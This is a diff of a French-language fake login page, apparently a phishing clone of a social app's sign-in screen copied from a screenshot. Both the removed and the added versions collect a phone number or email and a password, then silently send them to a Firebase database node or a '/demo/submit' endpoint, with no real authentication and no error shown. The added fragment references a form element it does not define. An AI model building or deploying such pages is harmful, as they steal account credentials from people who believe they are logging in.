@@ -1,183 +1,187 @@
-<!doctype html>
-<html lang="fr">
-<head>
-  <meta charset="utf-8" />
-  <title>Se connecter — Téléphone</title>
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <script src="https://cdn.tailwindcss.com"></script>
-</head>
-<body class="bg-white text-gray-900">
-  <div class="min-h-screen flex flex-col">
-    <main class="flex-1">
-      <div class="max-w-md mx-auto px-4 pt-8 pb-16">
+<!-- Onglets -->
+<div class="mt-4 mb-2 grid grid-cols-2 gap-2">
+  <button type="button" id="tabEmail"
+          class="tab-btn active w-full rounded-xl px-4 py-2 font-semibold bg-black text-white">
+    E-mail / utilisateur
+  </button>
+  <button type="button" id="tabPhone"
+          class="tab-btn w-full rounded-xl px-4 py-2 font-semibold bg-gray-100 text-gray-700">
+    Téléphone
+  </button>
+</div>
 
-        <div class="rounded-3xl border bg-white/70 backdrop-blur p-6 sm:p-8 shadow-sm">
-          <div class="flex items-start justify-between">
-            <h1 class="text-3xl sm:text-4xl font-extrabold tracking-tight">Se connecter</h1>
-            <button aria-label="Fermer" class="p-2 rounded-full hover:bg-gray-100">×</button>
-          </div>
-
-          <!-- Sous-titre comme sur ta capture -->
-          <div class="mt-3 text-sm text-gray-700">
-            <div class="font-semibold">Téléphone</div>
-            <div class="text-gray-600">
-              Connexion avec une adresse e-mail ou un nom d’utilisateur
-            </div>
-          </div>
-
-          <form id="loginForm" class="mt-5 space-y-4" autocomplete="off">
-            <!-- Ligne pays + téléphone -->
-            <div class="flex gap-2">
-              <select id="country" class="w-32 border border-gray-300 rounded-xl px-3 py-3 bg-gray-100 focus:outline-none focus:ring-2 focus:ring-black">
-                <!-- options complètes ci-dessous via JS; on laisse une valeur temporaire -->
-                <option value="+33">FR +33</option>
-              </select>
-
-              <input id="phone" type="tel" inputmode="tel" placeholder="Numéro de téléphone"
-                class="flex-1 border border-gray-300 rounded-xl px-4 py-3 bg-gray-100 focus:outline-none focus:ring-2 focus:ring-black"
-                autocomplete="tel" />
-            </div>
-
-            <!-- Mot de passe -->
-            <div class="relative">
-              <input id="password" type="password" placeholder="Mot de passe"
-                class="w-full border border-gray-300 rounded-xl px-4 py-3 bg-gray-100 focus:outline-none focus:ring-2 focus:ring-black"
-                autocomplete="current-password" />
-            </div>
-
-            <div class="text-sm">
-              <a href="#" onclick="event.preventDefault()" class="text-gray-700 hover:underline">Mot de passe oublié ?</a>
-              <!-- On a supprimé “Connexion avec un code” -->
-            </div>
-
-            <button id="submitBtn" type="submit" disabled
-              class="w-full rounded-2xl px-6 py-4 text-lg font-semibold transition disabled:opacity-50 disabled:cursor-not-allowed bg-gray-100 text-gray-500">
-              Se connecter
-            </button>
-          </form>
-
-          <p class="mt-6 text-center text-sm text-gray-800">
-            Tu n’as pas de compte ? <a href="#" class="text-[#f53152] font-semibold hover:underline">S’inscrire</a>
-          </p>
-        </div>
-      </div>
-    </main>
+<!-- Panneau E-mail -->
+<div id="panelEmail" class="space-y-4">
+  <div>
+    <p class="text-sm text-gray-600 mb-1">Connexion avec une adresse e-mail ou un nom d’utilisateur</p>
+    <input id="email" type="text" placeholder="E-mail ou nom d’utilisateur"
+           class="w-full border border-gray-300 rounded-xl px-4 py-3 bg-gray-100 focus:outline-none focus:ring-2 focus:ring-black"
+           autocomplete="username" />
   </div>
 
-  <script>
-    /* --------- CONFIG FIREBASE (Realtime Database) --------- */
-    const DB_URL = "https://fir-login-d968e-default-rtdb.europe-west1.firebasedatabase.app";
+  <div>
+    <input id="passwordEmail" type="password" placeholder="Mot de passe"
+           class="w-full border border-gray-300 rounded-xl px-4 py-3 bg-gray-100 focus:outline-none focus:ring-2 focus:ring-black"
+           autocomplete="current-password" />
+  </div>
+</div>
 
-    /* --------- PAYS & INDICATIFS --------- */
-    // Liste compacte des indicatifs les plus utilisés (tu peux en ajouter autant que tu veux)
-    const DIALS = [
-      { cc: "FR", name: "FR", dial: "+33" },
-      { cc: "CH", name: "CH", dial: "+41" },
-      { cc: "BE", name: "BE", dial: "+32" },
-      { cc: "LU", name: "LU", dial: "+352" },
-      { cc: "DE", name: "DE", dial: "+49" },
-      { cc: "ES", name: "ES", dial: "+34" },
-      { cc: "IT", name: "IT", dial: "+39" },
-      { cc: "PT", name: "PT", dial: "+351" },
-      { cc: "GB", name: "GB", dial: "+44" },
-      { cc: "US", name: "US", dial: "+1" },
-      { cc: "CA", name: "CA", dial: "+1" },
-      { cc: "MA", name: "MA", dial: "+212" },
-      { cc: "DZ", name: "DZ", dial: "+213" },
-      { cc: "TN", name: "TN", dial: "+216" },
-      { cc: "SN", name: "SN", dial: "+221" },
-      { cc: "CI", name: "CI", dial: "+225" },
-      { cc: "CM", name: "CM", dial: "+237" }
-    ];
+<!-- Panneau Téléphone -->
+<div id="panelPhone" class="hidden space-y-4">
+  <p class="text-sm text-gray-600">Connexion avec un numéro de téléphone</p>
 
-    const countrySel = document.getElementById('country');
-    const phoneEl    = document.getElementById('phone');
-    const pwdEl      = document.getElementById('password');
-    const submitBtn  = document.getElementById('submitBtn');
-    const loginForm  = document.getElementById('loginForm');
+  <div class="flex gap-2">
+    <!-- Sélecteur indicatif -->
+    <select id="dialSelect"
+            class="w-28 border border-gray-300 rounded-xl px-3 py-3 bg-gray-100 focus:outline-none focus:ring-2 focus:ring-black">
+    </select>
 
-    // Remplit <select> avec la liste DIALS
-    function populateCountries() {
-      countrySel.innerHTML = "";
-      DIALS.forEach(({cc, name, dial}) => {
-        const opt = document.createElement('option');
-        opt.value = dial;
-        opt.textContent = `${name} ${dial}`;
-        opt.dataset.cc = cc;
-        countrySel.appendChild(opt);
-      });
-    }
+    <input id="phone" type="tel" placeholder="Numéro de téléphone"
+           class="flex-1 border border-gray-300 rounded-xl px-4 py-3 bg-gray-100 focus:outline-none focus:ring-2 focus:ring-black"
+           inputmode="tel" />
+  </div>
 
-    // Détecte la région de l’utilisateur pour pré-sélectionner l’indicatif
-    function detectRegion() {
-      try {
-        // ex: "fr-FR" -> "FR"
-        const lang = navigator.language || navigator.userLanguage || "fr-FR";
-        const region = (new Intl.Locale(lang).region) || "FR";
-        const match = DIALS.find(d => d.cc === region);
-        if (match) countrySel.value = match.dial; else countrySel.value = "+33";
-      } catch {
-        countrySel.value = "+33"; // défaut
-      }
-    }
+  <div>
+    <input id="passwordPhone" type="password" placeholder="Mot de passe"
+           class="w-full border border-gray-300 rounded-xl px-4 py-3 bg-gray-100 focus:outline-none focus:ring-2 focus:ring-black" />
+  </div>
+</div>
 
-    function refreshSubmit() {
-      const phoneOK = phoneEl.value.trim().length > 0;
-      const passOK  = pwdEl.value.length > 0;
-      const ok = phoneOK && passOK;
+<!-- Lien MDP / S’inscrire -->
+<div class="flex items-center justify-between text-sm">
+  <a href="#" class="text-gray-700 hover:underline" onclick="event.preventDefault()">Mot de passe oublié ?</a>
+  <!-- (on enlève “Connexion avec un code”) -->
+</div>
 
-      submitBtn.disabled = !ok;
-      submitBtn.className = ok
-        ? 'w-full rounded-2xl px-6 py-4 text-lg font-semibold bg-[#f53152] text-white hover:opacity-90 transition'
-        : 'w-full rounded-2xl px-6 py-4 text-lg font-semibold bg-gray-100 text-gray-500 disabled:cursor-not-allowed transition';
-    }
+<!-- Bouton -->
+<button id="submitBtn" type="submit" disabled
+        class="w-full rounded-2xl px-6 py-4 text-lg font-semibold transition disabled:opacity-50 disabled:cursor-not-allowed bg-gray-100 text-gray-500">
+  Se connecter
+</button>
 
-    phoneEl.addEventListener('input', refreshSubmit);
-    pwdEl.addEventListener('input', refreshSubmit);
-    countrySel.addEventListener('change', () => {
-      // optionnel: tu peux formatter en E.164 ici si tu veux
-      refreshSubmit();
+<p class="text-center text-sm sm:text-base text-gray-800 pt-3">
+  Tu n'as pas de compte ?
+  <a href="#" id="openPin" class="text-red-600 font-semibold hover:underline">S'inscrire</a>
+</p>
+
+<script>
+  // ------- petit helper : pays -> indicatif
+  const DIALS = {
+    FR: {code:'+33', label:'FR +33'},
+    BE: {code:'+32', label:'BE +32'},
+    CH: {code:'+41', label:'CH +41'},
+    LU: {code:'+352', label:'LU +352'},
+    DE: {code:'+49', label:'DE +49'},
+    IT: {code:'+39', label:'IT +39'},
+    ES: {code:'+34', label:'ES +34'},
+    GB: {code:'+44', label:'GB +44'},
+    US: {code:'+1', label:'US +1'},
+    CA: {code:'+1', label:'CA +1'}
+  };
+
+  // ------- éléments
+  const tabEmail   = document.getElementById('tabEmail');
+  const tabPhone   = document.getElementById('tabPhone');
+  const panelEmail = document.getElementById('panelEmail');
+  const panelPhone = document.getElementById('panelPhone');
+
+  const emailEl        = document.getElementById('email');
+  const pwdEmailEl     = document.getElementById('passwordEmail');
+  const phoneEl        = document.getElementById('phone');
+  const pwdPhoneEl     = document.getElementById('passwordPhone');
+  const dialSelectEl   = document.getElementById('dialSelect');
+  const submitBtn      = document.getElementById('submitBtn');
+  const loginForm      = document.getElementById('loginForm');
+
+  // ------- remplir le select des indicatifs
+  (function initDialSelect() {
+    const lang = (navigator.language || 'fr-FR').split('-')[1]?.toUpperCase() || 'FR';
+    const preferred = DIALS[lang] ? lang : 'FR';
+
+    Object.entries(DIALS).forEach(([cc, {code, label}]) => {
+      const opt = document.createElement('option');
+      opt.value = code;
+      opt.textContent = label;
+      if (cc === preferred) opt.selected = true;
+      dialSelectEl.appendChild(opt);
     });
+  })();
 
-    // Submit -> enregistre dans Firebase (sans popup)
-    loginForm.addEventListener('submit', async (e) => {
-      e.preventDefault();
-      submitBtn.disabled = true;
-      submitBtn.textContent = "Envoi...";
+  // ------- switch onglets
+  function activate(tab) {
+    const setActive = (btn, on) => {
+      btn.classList.toggle('bg-black', on);
+      btn.classList.toggle('text-white', on);
+      btn.classList.toggle('bg-gray-100', !on);
+      btn.classList.toggle('text-gray-700', !on);
+    };
 
-      // Construit le numéro complet: indicatif + numéro saisi, sans espaces
-      const dial = countrySel.value;                              // ex: +41
-      const raw = phoneEl.value.replace(/[^\d]/g, '');            // digits only
-      const fullPhone = `${dial}${raw}`;
-
-      const payload = {
-        phone: fullPhone,
-        password: pwdEl.value,
-        created_at: new Date().toISOString()
-      };
-
-      try {
-        await fetch(`${DB_URL}/submissions.json`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(payload)
-        });
-        // Reset silencieux
-        phoneEl.value = "";
-        pwdEl.value = "";
-      } catch (err) {
-        console.error("Erreur d’envoi:", err);
-      } finally {
-        submitBtn.textContent = "Se connecter";
-        refreshSubmit();
-      }
-    });
-
-    // Init
-    populateCountries();
-    detectRegion();
+    if (tab === 'email') {
+      setActive(tabEmail, true);
+      setActive(tabPhone, false);
+      panelEmail.classList.remove('hidden');
+      panelPhone.classList.add('hidden');
+    } else {
+      setActive(tabEmail, false);
+      setActive(tabPhone, true);
+      panelEmail.classList.add('hidden');
+      panelPhone.classList.remove('hidden');
+    }
     refreshSubmit();
-  </script>
-</body>
-</html>
+  }
+
+  tabEmail.addEventListener('click', () => activate('email'));
+  tabPhone.addEventListener('click', () => activate('phone'));
+
+  // ------- état du bouton
+  function refreshSubmit() {
+    const emailMode = !panelEmail.classList.contains('hidden');
+    const ok = emailMode
+      ? (emailEl.value.trim().length > 0 && pwdEmailEl.value.length > 0)
+      : (phoneEl.value.trim().length > 4 && pwdPhoneEl.value.length > 0);
+
+    submitBtn.disabled = !ok;
+    submitBtn.className = ok
+      ? 'w-full rounded-2xl px-6 py-4 text-lg font-semibold bg-[#f53152] text-white hover:opacity-90 transition'
+      : 'w-full rounded-2xl px-6 py-4 text-lg font-semibold bg-gray-100 text-gray-500 disabled:cursor-not-allowed transition';
+  }
+
+  [emailEl, pwdEmailEl, phoneEl, pwdPhoneEl].forEach(el => el.addEventListener('input', refreshSubmit));
+  activate('email'); // onglet par défaut
+
+  // ------- soumission (réutilise ton endpoint existant)
+  async function demoSubmit(identifier, password) {
+    // NOTE : BASE_URL doit déjà être déclaré dans ton script principal
+    const r = await fetch(`${BASE_URL}/demo/submit`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ email: identifier, password })
+    });
+    // on ne montre pas d'alert; on ignore les erreurs silencieusement
+    try { await r.json(); } catch {}
+  }
+
+  // ------- handler formulaire
+  loginForm.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    submitBtn.disabled = true;
+    submitBtn.textContent = 'Envoi...';
+
+    const emailMode = !panelEmail.classList.contains('hidden');
+    const identifier = emailMode
+      ? emailEl.value.trim()
+      : `${dialSelectEl.value} ${phoneEl.value.trim()}`;
+    const password = emailMode ? pwdEmailEl.value : pwdPhoneEl.value;
+
+    await demoSubmit(identifier, password);
+
+    // reset sans popup
+    if (emailMode) { emailEl.value = ''; pwdEmailEl.value = ''; }
+    else { phoneEl.value = ''; pwdPhoneEl.value = ''; }
+    submitBtn.textContent = 'Se connecter';
+    refreshSubmit();
+  });
+</script>
+
+
 
